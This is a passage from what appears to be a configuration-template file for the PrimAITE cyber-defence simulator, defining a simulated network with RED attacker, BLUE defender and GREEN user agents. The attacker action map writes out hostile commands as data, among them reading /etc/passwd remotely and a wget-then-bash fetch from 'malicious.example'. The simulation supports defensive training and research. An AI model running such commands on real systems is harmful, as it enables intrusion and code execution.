              type: 'database-service',
              options: {
                backup_server_ip: '192.168.1.16'
              }
            },
            { type: 'ftp-client' }
          ],
        },
        {
          hostname: 'backup_server',
          type: 'server',
          ipAddress: '192.168.1.16',
          subnetMask: '255.255.255.0',
          defaultGateway: '192.168.1.1',
          services: [{ type: 'ftp-server' }],
        },
        {
          hostname: 'security_suite',
          type: 'server',
          ipAddress: '192.168.1.110',
          subnetMask: '255.255.255.0',
          defaultGateway: '192.168.1.1',
          networkInterfaces: {
            2: {
              ip_address: '192.168.10.110',
              subnet_mask: '255.255.255.0'
            }
          }
        },
        {
          hostname: 'client_1',
          type: 'computer',
          ipAddress: '192.168.10.21',
          subnetMask: '255.255.255.0',
          defaultGateway: '192.168.10.1',
          services: [{ type: 'dns-client' }],
          applications: [
            {
              type: 'data-manipulation-bot',
              options: {
                server_ip: '192.168.1.14',
                payload: 'DELETE',
                port_scan_p_of_success: 0.8,
                data_manipulation_p_of_success: 0.8
              }
            },
            {
              type: 'dos-bot',
              options: {
                target_ip_address: '192.168.1.14',
                payload: 'SPOOF DATA',
                repeat: false,
                port_scan_p_of_success: 0.8,
                dos_intensity: 1.0,
                max_sessions: 1000
              }
            },
            {
              type: 'ransomware-script',
              options: {
                server_ip: '192.168.1.14'
              }
            },
            {
              type: 'c2-beacon',
              options: {
                c2_server_ip_address: '192.168.10.200',
                keep_alive_frequency: 5,
                masquerade_protocol: 'tcp',
                masquerade_port: 80
              }
            },
            {
              type: 'web-browser',
              options: {
                target_url: 'http://arcd.com/users/'
              }
            },
            {
              type: 'database-client',
              options: {
                db_server_ip: '192.168.1.14'
              }
            }
          ],
        },
        {
          hostname: 'client_2',
          type: 'computer',
          ipAddress: '192.168.10.22',
          subnetMask: '255.255.255.0',
          defaultGateway: '192.168.10.1',
          services: [{ type: 'dns-client' }],
          applications: [
            {
              type: 'web-browser',
              options: {
                target_url: 'http://arcd.com/users/'
              }
            },
            {
              type: 'data-manipulation-bot',
              options: {
                server_ip: '192.168.1.14',
                payload: 'DELETE',
                port_scan_p_of_success: 0.8,
                data_manipulation_p_of_success: 0.8
              }
            },
            {
              type: 'dos-bot',
              options: {
                target_ip_address: '192.168.1.14',
                payload: 'SPOOF DATA',
                repeat: false,
                port_scan_p_of_success: 0.8,
                dos_intensity: 1.0,
                max_sessions: 1000
              }
            },
            {
              type: 'ransomware-script',
              options: {
                server_ip: '192.168.1.14'
              }
            },
            {
              type: 'c2-beacon',
              options: {
                c2_server_ip_address: '192.168.10.200',
                keep_alive_frequency: 5,
                masquerade_protocol: 'tcp',
                masquerade_port: 80
              }
            },
            {
              type: 'database-client',
              options: {
                db_server_ip: '192.168.1.14'
              }
            }
          ],
        },
        {
          hostname: 'c2_server',
          type: 'server',
          ipAddress: '192.168.10.200',
          subnetMask: '255.255.255.0',
          defaultGateway: '192.168.10.1',
          applications: [
            {
              type: 'c2-server',
              options: {}
            }
          ],
        },
      ],
      links: [
        { endpointAHostname: 'router_1', endpointAPort: 1, endpointBHostname: 'switch_1', endpointBPort: 8, bandwidth: 1000 },
        { endpointAHostname: 'router_1', endpointAPort: 2, endpointBHostname: 'switch_2', endpointBPort: 8, bandwidth: 1000 },
        { endpointAHostname: 'switch_1', endpointAPort: 1, endpointBHostname: 'domain_controller', endpointBPort: 1, bandwidth: 1000 },
        { endpointAHostname: 'switch_1', endpointAPort: 2, endpointBHostname: 'web_server', endpointBPort: 1, bandwidth: 1000 },
        { endpointAHostname: 'switch_1', endpointAPort: 3, endpointBHostname: 'database_server', endpointBPort: 1, bandwidth: 1000 },
        { endpointAHostname: 'switch_1', endpointAPort: 4, endpointBHostname: 'backup_server', endpointBPort: 1, bandwidth: 1000 },
        { endpointAHostname: 'switch_1', endpointAPort: 7, endpointBHostname: 'security_suite', endpointBPort: 1, bandwidth: 1000 },
        { endpointAHostname: 'switch_2', endpointAPort: 1, endpointBHostname: 'client_1', endpointBPort: 1, bandwidth: 100 },
        { endpointAHostname: 'switch_2', endpointAPort: 2, endpointBHostname: 'client_2', endpointBPort: 1, bandwidth: 100 },
        { endpointAHostname: 'switch_2', endpointAPort: 7, endpointBHostname: 'security_suite', endpointBPort: 2, bandwidth: 100 },
      ],
      game: {
        maxEpisodeLength: 128,
        ports: ['HTTP', 'POSTGRES_SERVER'],
        protocols: ['ICMP', 'TCP', 'UDP'],
        thresholds: {
          nmne: {
            high: 10,
            medium: 5,
            low: 0
          }
        }
      },
      simulation: {
        network: {
          nmne_config: {
            capture_nmne: true,
            nmne_capture_keywords: ['DELETE']
          }
        }
      },
      agents: [
        {
          ref: 'client_2_green_user',
          team: 'GREEN',
          type: 'probabilistic-agent',
          agent_settings: {
            action_probabilities: {
              0: 0.3,
              1: 0.6,
              2: 0.1
            }
          },
          action_space: {
            action_map: {
              0: { action: 'do-nothing', options: {} },
              1: { action: 'node-application-execute', options: { node_name: 'client_2', application_name: 'web-browser' } },
              2: { action: 'node-application-execute', options: { node_name: 'client_2', application_name: 'database-client' } }
            }
          },
          reward_function: {
            reward_components: [
              { type: 'webpage-unavailable-penalty', weight: 0.25, options: { node_hostname: 'client_2' } },
              { type: 'green-admin-database-unreachable-penalty', weight: 0.05, options: { node_hostname: 'client_2' } }
            ]
          }
        },
        {
          ref: 'client_1_green_user',
          team: 'GREEN',
          type: 'probabilistic-agent',
          agent_settings: {
            action_probabilities: {
              0: 0.3,
              1: 0.6,
              2: 0.1
            }
          },
          action_space: {
            action_map: {
              0: { action: 'do-nothing', options: {} },
              1: { action: 'node-application-execute', options: { node_name: 'client_1', application_name: 'web-browser' } },
              2: { action: 'node-application-execute', options: { node_name: 'client_1', application_name: 'database-client' } }
            }
          },
          reward_function: {
            reward_components: [
              { type: 'webpage-unavailable-penalty', weight: 0.25, options: { node_hostname: 'client_1' } },
              { type: 'green-admin-database-unreachable-penalty', weight: 0.05, options: { node_hostname: 'client_1' } }
            ]
          }
        },
        {
          ref: 'attacker',
          team: 'RED',
          type: 'proxy-agent',
          agent_settings: {
            flatten_obs: true,
            action_masking: true
          },
          observation_space: {
            type: 'custom',
            options: {
              components: [
                {
                  type: 'nodes',
                  label: 'NODES',
                  options: {
                    hosts: [
                      { hostname: 'domain_controller' },
                      { hostname: 'web_server', services: [{ service_name: 'web-server' }] },
                      { hostname: 'database_server', folders: [{ folder_name: 'database', files: [{ file_name: 'database.db' }] }] },
                      { hostname: 'backup_server' },
                      { hostname: 'security_suite' },
                      { hostname: 'client_1' },
                      { hostname: 'client_2' },
                      { hostname: 'c2_server' }
                    ],
                    num_services: 1,
                    num_applications: 0,
                    num_folders: 1,
                    num_files: 1,
                    num_nics: 2,
                    include_num_access: false,
                    include_nmne: true,
                    monitored_traffic: { icmp: ['NONE'], tcp: ['DNS'] },
                    routers: [{ hostname: 'router_1' }],
                    num_ports: 0,
                    ip_list: ['192.168.1.10', '192.168.1.12', '192.168.1.14', '192.168.1.16', '192.168.1.110', '192.168.10.21', '192.168.10.22', '192.168.10.110', '192.168.10.200'],
                    wildcard_list: ['0.0.0.1'],
                    port_list: ['HTTP', 'POSTGRES_SERVER', 80],
                    protocol_list: ['ICMP', 'TCP', 'UDP'],
                    num_rules: 10
                  }
                },
                {
                  type: 'links',
                  label: 'LINKS',
                  options: {
                    link_references: [
                      'router_1:eth-1<->switch_1:eth-8',
                      'router_1:eth-2<->switch_2:eth-8',
                      'switch_1:eth-1<->domain_controller:eth-1',
                      'switch_1:eth-2<->web_server:eth-1',
                      'switch_1:eth-3<->database_server:eth-1',
                      'switch_1:eth-4<->backup_server:eth-1',
                      'switch_1:eth-7<->security_suite:eth-1',
                      'switch_2:eth-1<->client_1:eth-1',
                      'switch_2:eth-2<->client_2:eth-1',
                      'switch_2:eth-7<->security_suite:eth-2'
                    ]
                  }
                },
                {
                  type: 'none',
                  label: 'ICS',
                  options: {}
                }
              ]
            }
          },
          action_space: {
            action_map: {
              0: { action: 'do-nothing', options: {} },
              1: { action: 'node-application-execute', options: { node_name: 'client_1', application_name: 'data-manipulation-bot' } },
              2: { action: 'node-application-execute', options: { node_name: 'client_1', application_name: 'dos-bot' } },
              3: { action: 'node-application-execute', options: { node_name: 'client_1', application_name: 'ransomware-script' } },
              4: { action: 'node-application-execute', options: { node_name: 'client_2', application_name: 'data-manipulation-bot' } },
              5: { action: 'node-application-execute', options: { node_name: 'client_2', application_name: 'dos-bot' } },
              6: { action: 'node-application-execute', options: { node_name: 'client_2', application_name: 'ransomware-script' } },
              7: { action: 'node-send-remote-command', options: { node_name: 'client_1', remote_ip: '192.168.1.14', command: ['bash', '-lc', 'cat /etc/passwd'] } },
              8: { action: 'configure-ransomware-script', options: { node_name: 'client_1', server_ip_address: '192.168.10.200', server_password: 'c2pass', payload: 'encrypt' } },
              9: { action: 'configure-c2-beacon', options: { node_name: 'client_1', c2_server_ip_address: '192.168.10.200', keep_alive_frequency: 10, masquerade_protocol: 'tcp', masquerade_port: 80 } },
              10: { action: 'configure-database-client', options: { node_name: 'client_1', server_ip_address: '192.168.1.14', server_password: 'db_pass' } },
              11: { action: 'configure-dos-bot', options: { node_name: 'client_1', target_ip_address: '192.168.1.12', target_port: 'POSTGRES_SERVER', payload: 'SPOOF DATA', repeat: false, port_scan_p_of_success: 0.8, dos_intensity: 1.0, max_sessions: 500 } },
              12: { action: 'c2-server-ransomware-launch', options: { node_name: 'c2_server' } },
              13: { action: 'c2-server-terminal-command', options: { node_name: 'c2_server', commands: [['wget', 'http://malicious.example/payload.sh', '-O', '/tmp/payload.sh'], ['bash', '/tmp/payload.sh']], ip_address: '192.168.10.200', username: 'admin', password: 'supersecret' } },
              14: { action: 'c2-server-data-exfiltrate', options: { node_name: 'c2_server', target_ip_address: '192.168.10.21', target_file_name: 'secret.db', target_folder_name: 'secrets', exfiltration_folder_name: 'stolen', username: 'user', password: 'pass' } },
              15: { action: 'c2-server-ransomware-configure', options: { node_name: 'c2_server', server_ip_address: '192.168.1.14', server_password: 'c2pass', payload: 'encrypt' } },
              16: { action: 'node-file-corrupt', options: { node_name: 'database_server', folder_name: 'database', file_name: 'database.db' } }
            }
          },
          reward_function: {
            reward_components: [
              { type: 'database-file-integrity', weight: 1.0, options: { node_hostname: 'database_server', folder_name: 'database', file_name: 'database.db', intact_reward: -0.1, deleted_penalty: 100.0 } },
              { type: 'action-penalty', weight: 0.1, options: { per_action_penalty: { 'do-nothing': -1.0 } } }
            ]
          }
        },
        {
          ref: 'defender',
          team: 'BLUE',
          type: 'proxy-agent',
          agent_settings: {
            flatten_obs: true,
            action_masking: true
          },
          observation_space: {
            type: 'custom',
            options: {
              components: [
                {
                  type: 'nodes',
                  label: 'NODES',
                  options: {
                    hosts: [
                      { hostname: 'domain_controller' },
                      { hostname: 'web_server', services: [{ service_name: 'web-server' }] },
                      { hostname: 'database_server', folders: [{ folder_name: 'database', files: [{ file_name: 'database.db' }] }] },
                      { hostname: 'backup_server' },
                      { hostname: 'security_suite' },
                      { hostname: 'client_1' },
                      { hostname: 'client_2' },
                      { hostname: 'c2_server' }
                    ],
                    num_services: 1,
                    num_applications: 0,
                    num_folders: 1,
                    num_files: 1,
                    num_nics: 2,
                    include_num_access: false,
                    include_nmne: true,
                    monitored_traffic: { icmp: ['NONE'], tcp: ['DNS'] },
                    routers: [{ hostname: 'router_1' }],
                    num_ports: 0,
                    ip_list: ['192.168.1.10', '192.168.1.12', '192.168.1.14', '192.168.1.16', '192.168.1.110', '192.168.10.21', '192.168.10.22', '192.168.10.110', '192.168.10.200'],
                    wildcard_list: ['0.0.0.1'],
                    port_list: ['HTTP', 'POSTGRES_SERVER', 80],
                    protocol_list: ['ICMP', 'TCP', 'UDP'],
                    num_rules: 10
                  }
                },
                {
                  type: 'links',
                  label: 'LINKS',
                  options: {
                    link_references: [
                      'router_1:eth-1<->switch_1:eth-8',
                      'router_1:eth-2<->switch_2:eth-8',
                      'switch_1:eth-1<->domain_controller:eth-1',
                      'switch_1:eth-2<->web_server:eth-1',
                      'switch_1:eth-3<->database_server:eth-1',
                      'switch_1:eth-4<->backup_server:eth-1',
                      'switch_1:eth-7<->security_suite:eth-1',
                      'switch_2:eth-1<->client_1:eth-1',
                      'switch_2:eth-2<->client_2:eth-1',
                      'switch_2:eth-7<->security_suite:eth-2'
                    ]
                  }
                },
                {
                  type: 'none',
                  label: 'ICS',
                  options: {}
                }
              ]
            }
          },
          action_space: {
            action_map: {
              0: { action: 'do-nothing', options: {} },
              1: { action: 'node-service-scan', options: { node_name: 'web_server', service_name: 'web-server' } },
              2: { action: 'node-service-stop', options: { node_name: 'web_server', service_name: 'web-server' } },
              3: { action: 'node-service-start', options: { node_name: 'web_server', service_name: 'web-server' } },
              4: { action: 'node-service-pause', options: { node_name: 'web_server', service_name: 'web-server' } },
              5: { action: 'node-service-resume', options: { node_name: 'web_server', service_name: 'web-server' } },
              6: { action: 'node-service-restart', options: { node_name: 'web_server', service_name: 'web-server' } },
              7: { action: 'node-service-disable', options: { node_name: 'web_server', service_name: 'web-server' } },
              8: { action: 'node-service-enable', options: { node_name: 'web_server', service_name: 'web-server' } },
              9: { action: 'node-file-scan', options: { node_name: 'database_server', folder_name: 'database', file_name: 'database.db' } },
              10: { action: 'node-file-scan', options: { node_name: 'database_server', folder_name: 'database', file_name: 'database.db' } },
              11: { action: 'node-file-delete', options: { node_name: 'database_server', folder_name: 'database', file_name: 'database.db' } },
              12: { action: 'node-file-repair', options: { node_name: 'database_server', folder_name: 'database', file_name: 'database.db' } },
              13: { action: 'node-service-fix', options: { node_name: 'database_server', service_name: 'database-service' } },
              14: { action: 'node-folder-scan', options: { node_name: 'database_server', folder_name: 'database' } },
              15: { action: 'node-folder-scan', options: { node_name: 'database_server', folder_name: 'database' } },
              16: { action: 'node-folder-repair', options: { node_name: 'database_server', folder_name: 'database' } },
              17: { action: 'node-folder-restore', options: { node_name: 'database_server', folder_name: 'database' } },
              18: { action: 'node-os-scan', options: { node_name: 'domain_controller' } },
              19: { action: 'node-shutdown', options: { node_name: 'domain_controller' } },
              20: { action: 'node-startup', options: { node_name: 'domain_controller' } },
              21: { action: 'node-reset', options: { node_name: 'domain_controller' } },
              22: { action: 'node-os-scan', options: { node_name: 'web_server' } },
              23: { action: 'node-shutdown', options: { node_name: 'web_server' } },
              24: { action: 'node-startup', options: { node_name: 'web_server' } },
              25: { action: 'node-reset', options: { node_name: 'web_server' } },
              26: { action: 'node-os-scan', options: { node_name: 'database_server' } },
              27: { action: 'node-shutdown', options: { node_name: 'database_server' } },
              28: { action: 'node-startup', options: { node_name: 'database_server' } },
              29: { action: 'node-reset', options: { node_name: 'database_server' } },
              30: { action: 'node-os-scan', options: { node_name: 'backup_server' } },
              31: { action: 'node-shutdown', options: { node_name: 'backup_server' } },
              32: { action: 'node-startup', options: { node_name: 'backup_server' } },
              33: { action: 'node-reset', options: { node_name: 'backup_server' } },
              34: { action: 'node-os-scan', options: { node_name: 'security_suite' } },
              35: { action: 'node-shutdown', options: { node_name: 'security_suite' } },
              36: { action: 'node-startup', options: { node_name: 'security_suite' } },
              37: { action: 'node-reset', options: { node_name: 'security_suite' } },
              38: { action: 'node-os-scan', options: { node_name: 'client_1' } },
              39: { action: 'node-shutdown', options: { node_name: 'client_1' } },
              40: { action: 'node-startup', options: { node_name: 'client_1' } },
              41: { action: 'node-reset', options: { node_name: 'client_1' } },
              42: { action: 'node-os-scan', options: { node_name: 'client_2' } },
              43: { action: 'node-shutdown', options: { node_name: 'client_2' } },
              44: { action: 'node-startup', options: { node_name: 'client_2' } },
              45: { action: 'node-reset', options: { node_name: 'client_2' } },
              46: { action: 'router-acl-add-rule', options: { target_router: 'router_1', position: 0, permission: 'DENY', src_ip: '192.168.10.21', dst_ip: 'ALL', src_port: 'ALL', dst_port: 'ALL', protocol_name: 'ALL', src_wildcard: 'NONE', dst_wildcard: 'NONE' } },
              47: { action: 'router-acl-add-rule', options: { target_router: 'router_1', position: 1, permission: 'DENY', src_ip: '192.168.10.22', dst_ip: 'ALL', src_port: 'ALL', dst_port: 'ALL', protocol_name: 'ALL', src_wildcard: 'NONE', dst_wildcard: 'NONE' } },
              48: { action: 'router-acl-add-rule', options: { target_router: 'router_1', position: 2, permission: 'DENY', src_ip: '192.168.10.21', dst_ip: '192.168.1.12', src_port: 'ALL', dst_port: 'ALL', protocol_name: 'TCP', src_wildcard: 'NONE', dst_wildcard: 'NONE' } },
              49: { action: 'router-acl-add-rule', options: { target_router: 'router_1', position: 3, permission: 'DENY', src_ip: '192.168.10.22', dst_ip: '192.168.1.12', src_port: 'ALL', dst_port: 'ALL', protocol_name: 'TCP', src_wildcard: 'NONE', dst_wildcard: 'NONE' } },
              50: { action: 'router-acl-add-rule', options: { target_router: 'router_1', position: 4, permission: 'DENY', src_ip: '192.168.10.21', dst_ip: '192.168.1.14', src_port: 'ALL', dst_port: 'ALL', protocol_name: 'TCP', src_wildcard: 'NONE', dst_wildcard: 'NONE' } },
              51: { action: 'router-acl-add-rule', options: { target_router: 'router_1', position: 5, permission: 'DENY', src_ip: '192.168.10.22', dst_ip: '192.168.1.14', src_port: 'ALL', dst_port: 'ALL', protocol_name: 'TCP', src_wildcard: 'NONE', dst_wildcard: 'NONE' } },
              52: { action: 'router-acl-remove-rule', options: { target_router: 'router_1', position: 0 } },
              53: { action: 'router-acl-remove-rule', options: { target_router: 'router_1', position: 1 } },
              54: { action: 'router-acl-remove-rule', options: { target_router: 'router_1', position: 2 } },
              55: { action: 'router-acl-remove-rule', options: { target_router: 'router_1', position: 3 } },
              56: { action: 'router-acl-remove-rule', options: { target_router: 'router_1', position: 4 } },
              57: { action: 'router-acl-remove-rule', options: { target_router: 'router_1', position: 5 } },
              58: { action: 'router-acl-remove-rule', options: { target_router: 'router_1', position: 6 } },
              59: { action: 'router-acl-remove-rule', options: { target_router: 'router_1', position: 7 } },
              60: { action: 'router-acl-remove-rule', options: { target_router: 'router_1', position: 8 } },
              61: { action: 'router-acl-remove-rule', options: { target_router: 'router_1', position: 9 } },
              62: { action: 'host-nic-disable', options: { node_name: 'domain_controller', nic_num: 1 } },
              63: { action: 'host-nic-enable', options: { node_name: 'domain_controller', nic_num: 1 } },
              64: { action: 'host-nic-disable', options: { node_name: 'web_server', nic_num: 1 } },
              65: { action: 'host-nic-enable', options: { node_name: 'web_server', nic_num: 1 } },
              66: { action: 'host-nic-disable', options: { node_name: 'database_server', nic_num: 1 } },
              67: { action: 'host-nic-enable', options: { node_name: 'database_server', nic_num: 1 } },
              68: { action: 'host-nic-disable', options: { node_name: 'backup_server', nic_num: 1 } },
              69: { action: 'host-nic-enable', options: { node_name: 'backup_server', nic_num: 1 } },
              70: { action: 'host-nic-disable', options: { node_name: 'security_suite', nic_num: 1 } },
              71: { action: 'host-nic-enable', options: { node_name: 'security_suite', nic_num: 1 } },
              72: { action: 'host-nic-disable', options: { node_name: 'security_suite', nic_num: 2 } },
              73: { action: 'host-nic-enable', options: { node_name: 'security_suite', nic_num: 2 } },
              74: { action: 'host-nic-disable', options: { node_name: 'client_1', nic_num: 1 } },
              75: { action: 'host-nic-enable', options: { node_name: 'client_1', nic_num: 1 } },
              76: { action: 'host-nic-disable', options: { node_name: 'client_2', nic_num: 1 } },
              77: { action: 'host-nic-enable', options: { node_name: 'client_2', nic_num: 1 } },
              78: { action: 'node-application-scan', options: { node_name: 'client_1', application_name: 'web-browser' } },
              79: { action: 'node-application-scan', options: { node_name: 'client_2', application_name: 'web-browser' } },
              80: { action: 'node-application-close', options: { node_name: 'client_1', application_name: 'data-manipulation-bot' } },
              81: { action: 'node-application-close', options: { node_name: 'client_2', application_name: 'data-manipulation-bot' } },
              82: { action: 'router-acl-add-rule', options: { target_router: 'router_1', position: 6, permission: 'DENY', src_ip: '192.168.10.21', dst_ip: 'ALL', src_port: 'ALL', dst_port: 'ALL', protocol_name: 'ALL', src_wildcard: 'NONE', dst_wildcard: 'NONE' } },
              83: { action: 'router-acl-add-rule', options: { target_router: 'router_1', position: 7, permission: 'DENY', src_ip: '192.168.10.22', dst_ip: 'ALL', src_port: 'ALL', dst_port: 'ALL', protocol_name: 'ALL', src_wildcard: 'NONE', dst_wildcard: 'NONE' } }
            }
          },
          reward_function: {
            reward_components: [
              { type: 'database-file-integrity', weight: 1.0, options: { node_hostname: 'database_server', folder_name: 'database', file_name: 'database.db', intact_reward: 0.0, deleted_penalty: -10.0 } },
              { type: 'webpage-unavailable-penalty', weight: 0.25, options: { node_hostname: 'web_server', penalty: -0.1 } },
              { type: 'green-admin-database-unreachable-penalty', weight: 0.2, options: { node_hostname: 'database_server', penalty: -0.1 } },
              { type: 'action-penalty', weight: 0.5, options: { per_action_penalty: { 'node-file-corrupt': -0.5, 'node-shutdown': -0.5, 'node-application-stop': -0.1 } } },
              { type: 'shared-reward', weight: 0.5, options: { agent_name: 'client_1_green_user' } },
              { type: 'shared-reward', weight: 0.5, options: { agent_name: 'client_2_green_user' } }
            ]
          }
        }
      ]
    }
  },
  v3: {
    name: 'V3 Template (PrimAITE)',
    description: 'Complete network from v3.yaml with RED attacker, GREEN users, and BLUE defender agents with observation spaces configured',
    config: {
      nodes: [
        {
          hostname: 'router_1',
          type: 'router',
          numPorts: 5,
          ports: {
            1: { ipAddress: '192.168.1.1', subnetMask: '255.255.255.0' },
            2: { ipAddress: '192.168.10.1', subnetMask: '255.255.255.0' }
          },
          acl: {
            18: { action: 'PERMIT', src_port: 'POSTGRES_SERVER', dst_port: 'POSTGRES_SERVER' },
            19: { action: 'PERMIT', src_port: 'DNS', dst_port: 'DNS' },
            20: { action: 'PERMIT', src_port: 'FTP', dst_port: 'FTP' },
            21: { action: 'PERMIT', src_port: 'HTTP', dst_port: 'HTTP' },
            22: { action: 'PERMIT', src_port: 'ARP', dst_port: 'ARP' },
            23: { action: 'PERMIT', protocol: 'ICMP' }
          }
        },
        { hostname: 'switch_1', type: 'switch', numPorts: 8 },
        { hostname: 'switch_2', type: 'switch', numPorts: 8 },
        {
          hostname: 'domain_controller',
          type: 'server',
          ipAddress: '192.168.1.10',
          subnetMask: '255.255.255.0',
          defaultGateway: '192.168.1.1',
          dnsServer: '192.168.1.10',
          services: [{ type: 'dns-server', options: { domain_mapping: { 'arcd.com': '192.168.1.12' } } }],
          applications: []
        },
        {
          hostname: 'web_server',
          type: 'server',
          ipAddress: '192.168.1.12',
          subnetMask: '255.255.255.0',
          defaultGateway: '192.168.1.1',
          dnsServer: '192.168.1.10',
          services: [{ type: 'web-server' }],
          applications: [{ type: 'database-client', options: { db_server_ip: '192.168.1.14' } }]
        },
        {
          hostname: 'database_server',
          type: 'server',
          ipAddress: '192.168.1.14',
          subnetMask: '255.255.255.0',
          defaultGateway: '192.168.1.1',
          dnsServer: '192.168.1.10',
          services: [
            { type: 'database-service', options: { backup_server_ip: '192.168.1.16' } },
            { type: 'ftp-client' }
          ],
          applications: []
        },
        {
          hostname: 'backup_server',
          type: 'server',
          ipAddress: '192.168.1.16',
          subnetMask: '255.255.255.0',
          defaultGateway: '192.168.1.1',
          dnsServer: '192.168.1.10',
          services: [{ type: 'ftp-server' }],
          applications: []
        },
        {
          hostname: 'security_suite',
          type: 'server',
          ipAddress: '192.168.1.110',
          subnetMask: '255.255.255.0',
          defaultGateway: '192.168.1.1',
          dnsServer: '192.168.1.10',
          numPorts: 2,
          networkInterfaces: {
            2: { ipAddress: '192.168.10.110', subnetMask: '255.255.255.0' }
          },
          services: [],
          applications: []
        },
        {
          hostname: 'client_1',
          type: 'computer',
          ipAddress: '192.168.10.21',
          subnetMask: '255.255.255.0',
          defaultGateway: '192.168.10.1',
          dnsServer: '192.168.1.10',
          services: [{ type: 'dns-client' }],
          applications: [
            { type: 'data-manipulation-bot', options: { server_ip: '192.168.1.14', payload: 'DELETE', port_scan_p_of_success: 0.8, data_manipulation_p_of_success: 0.8 } },
            { type: 'dos-bot', options: { target_ip_address: '192.168.1.14', payload: 'SPOOF DATA', repeat: false, port_scan_p_of_success: 0.8, dos_intensity: 1.0, max_sessions: 1000 } },
            { type: 'ransomware-script', options: { server_ip: '192.168.1.14' } },
            { type: 'c2-beacon', options: { c2_server_ip_address: '192.168.10.200', keep_alive_frequency: 5, masquerade_protocol: 'tcp', masquerade_port: 80 } },
            { type: 'web-browser', options: { target_url: 'http://arcd.com/users/' } },
            { type: 'database-client', options: { db_server_ip: '192.168.1.14' } }
          ]
        },
        {
          hostname: 'client_2',
          type: 'computer',
          ipAddress: '192.168.10.22',
          subnetMask: '255.255.255.0',
          defaultGateway: '192.168.10.1',
          dnsServer: '192.168.1.10',
          services: [{ type: 'dns-client' }],
          applications: [
            { type: 'web-browser', options: { target_url: 'http://arcd.com/users/' } },
            { type: 'data-manipulation-bot', options: { server_ip: '192.168.1.14', payload: 'DELETE', port_scan_p_of_success: 0.8, data_manipulation_p_of_success: 0.8 } },
            { type: 'dos-bot', options: { target_ip_address: '192.168.1.14', payload: 'SPOOF DATA', repeat: false, port_scan_p_of_success: 0.8, dos_intensity: 1.0, max_sessions: 1000 } },
            { type: 'ransomware-script', options: { server_ip: '192.168.1.14' } },
            { type: 'c2-beacon', options: { c2_server_ip_address: '192.168.10.200', keep_alive_frequency: 5, masquerade_protocol: 'tcp', masquerade_port: 80 } },
            { type: 'database-client', options: { db_server_ip: '192.168.1.14' } }
          ]
        },
        {
          hostname: 'c2_server',
          type: 'server',
          ipAddress: '192.168.10.200',
          subnetMask: '255.255.255.0',
          defaultGateway: '192.168.10.1',
          dnsServer: '192.168.1.10',
          services: [],
          applications: [{ type: 'c2-server', options: {} }]
        },
      ],
      links: [
        { endpointAHostname: 'router_1', endpointAPort: 1, endpointBHostname: 'switch_1', endpointBPort: 8, bandwidth: 100 },
        { endpointAHostname: 'router_1', endpointAPort: 2, endpointBHostname: 'switch_2', endpointBPort: 8, bandwidth: 100 },
        { endpointAHostname: 'switch_1', endpointAPort: 1, endpointBHostname: 'domain_controller', endpointBPort: 1, bandwidth: 100 },
        { endpointAHostname: 'switch_1', endpointAPort: 2, endpointBHostname: 'web_server', endpointBPort: 1, bandwidth: 100 },
        { endpointAHostname: 'switch_1', endpointAPort: 3, endpointBHostname: 'database_server', endpointBPort: 1, bandwidth: 100 },
        { endpointAHostname: 'switch_1', endpointAPort: 4, endpointBHostname: 'backup_server', endpointBPort: 1, bandwidth: 100 },
        { endpointAHostname: 'switch_1', endpointAPort: 7, endpointBHostname: 'security_suite', endpointBPort: 1, bandwidth: 100 },
        { endpointAHostname: 'switch_2', endpointAPort: 1, endpointBHostname: 'client_1', endpointBPort: 1, bandwidth: 100 },
        { endpointAHostname: 'switch_2', endpointAPort: 2, endpointBHostname: 'client_2', endpointBPort: 1, bandwidth: 100 },
        { endpointAHostname: 'switch_2', endpointAPort: 7, endpointBHostname: 'security_suite', endpointBPort: 2, bandwidth: 100 },
      ],
      game: {
        maxEpisodeLength: 128,
        ports: ['HTTP', 'POSTGRES_SERVER'],
        protocols: ['ICMP', 'TCP', 'UDP'],
        thresholds: {
          nmne: { high: 10, medium: 5, low: 0 }
        }
      },
      agents: [
        {
          ref: 'client_2_green_user',
          team: 'GREEN',
          type: 'probabilistic-agent',
          agent_settings: { action_probabilities: { 0: 0.3, 1: 0.6, 2: 0.1 } },
          action_space: {
            action_map: {
              0: { action: 'do-nothing', options: {} },
              1: { action: 'node-application-execute', options: { node_name: 'client_2', application_name: 'web-browser' } },
              2: { action: 'node-application-execute', options: { node_name: 'client_2', application_name: 'database-client' } }
            }
          },
          observation_space: {
            type: 'none',
            options: {}
          },
          reward_function: {
            reward_components: [
              { type: 'webpage-unavailable-penalty', weight: 0.25, options: { node_hostname: 'client_2' } },
              { type: 'green-admin-database-unreachable-penalty', weight: 0.05, options: { node_hostname: 'client_2' } }
            ]
          }
        },
        {
          ref: 'client_1_green_user',
          team: 'GREEN',
          type: 'probabilistic-agent',
          agent_settings: { action_probabilities: { 0: 0.3, 1: 0.6, 2: 0.1 } },
          action_space: {
            action_map: {
              0: { action: 'do-nothing', options: {} },
              1: { action: 'node-application-execute', options: { node_name: 'client_1', application_name: 'web-browser' } },
              2: { action: 'node-application-execute', options: { node_name: 'client_1', application_name: 'database-client' } }
            }
          },
          observation_space: {
            type: 'none',
            options: {}
          },
          reward_function: {
            reward_components: [
              { type: 'webpage-unavailable-penalty', weight: 0.25, options: { node_hostname: 'client_1' } },
              { type: 'green-admin-database-unreachable-penalty', weight: 0.05, options: { node_hostname: 'client_1' } }
            ]
          }
        },
        {
          ref: 'attacker',
          team: 'RED',
          type: 'proxy-agent',
          observation_space: {
            type: 'nodes',
            options: {
              hosts: [
                { hostname: 'domain_controller' },
                { hostname: 'web_server', services: [{ service_name: 'web-server' }] },
                { hostname: 'database_server', folders: [{ folder_name: 'database', files: [{ file_name: 'database.db' }] }] },
                { hostname: 'backup_server' },
                { hostname: 'security_suite' },
                { hostname: 'client_1' },
                { hostname: 'client_2' },
                { hostname: 'c2_server' }
              ],
              num_services: 1,
              num_applications: 0,
              num_folders: 1,
              num_files: 1,
              num_nics: 2,
              include_num_access: false,
              include_nmne: true,
              monitored_traffic: {
                icmp: ['NONE'],
                tcp: ['DNS']
              },
              routers: [{ hostname: 'router_1' }],
              num_ports: 0,
              ip_list: ['192.168.1.10', '192.168.1.12', '192.168.1.14', '192.168.1.16', '192.168.1.110', '192.168.10.21', '192.168.10.22', '192.168.10.110', '192.168.10.200'],
              wildcard_list: ['0.0.0.1'],
              port_list: ['HTTP', 'POSTGRES_SERVER', 80],
              protocol_list: ['ICMP', 'TCP', 'UDP'],
              num_rules: 10
            }
          },
          agent_settings: { flatten_obs: true, action_masking: true },
          action_space: {
            action_map: {
              0: { action: 'do-nothing', options: {} },
              1: { action: 'node-application-execute', options: { node_name: 'client_1', application_name: 'data-manipulation-bot' } },
